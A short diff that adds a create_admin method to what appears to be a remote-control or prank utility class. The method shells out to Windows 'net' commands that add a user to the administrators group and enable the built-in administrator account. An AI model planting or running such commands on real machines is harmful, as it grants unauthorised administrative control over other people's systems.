@@ -60,6 +60,18 @@ class functions():
     os.remove(currentFile)
 
   @staticmethod
+  def create_admin():
+    # Creates a local admin and attempts to sign into it
+
+    # METHOD 1
+    os.system('net localgroup administrators [username] /add')
+    #https://operating-systems.wonderhowto.com/how-to/create-admin-user-account-using-cmd-prompt-windows-0125689/
+
+    # METHOD 2
+    os.system('net user administrator /active:yes')
+    #https://www.ionos.com/digitalguide/server/configuration/enable-administrator-account-windows-10/#:~:text=Quick%20guide%3A%20Enable%20administrator%20account%20in%20Windows%2010,-Using%20a%20command&text=Open%20%E2%80%9CRun%E2%80%9D%20with%20%5BWindows,administrator%20account%20is%20now%20activated.
+
+  @staticmethod
   # TEST ON PC
   def minimize_current_window():
     try:
